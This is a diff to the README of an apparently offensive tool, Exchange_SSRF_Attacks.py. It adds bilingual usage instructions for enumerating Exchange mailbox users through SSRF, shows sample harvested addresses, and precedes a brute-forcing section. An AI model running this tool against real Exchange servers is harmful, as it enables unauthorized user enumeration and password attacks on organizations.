@@ -4,6 +4,27 @@
 
 https://mp.weixin.qq.com/s/GFcEKA48bPWsezNdVcrWag
 
+
+
+## Get  100 Email Users  Without By Brute 无需爆破获取100条邮箱用户
+
+run 运行程序：
+
+```
+python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Get
+```
+
+result 结果：
+
+```
+Email Address  : jumbo@exchange.com
+Email Address  : account@exchange.com
+Email Address  : support@exchange.com
+Email Address  : addd@exchange.com
+```
+
+
+
 ## Brute Account 爆破可能存在的用户
 
 file with emails 需要尝试的邮箱文件：
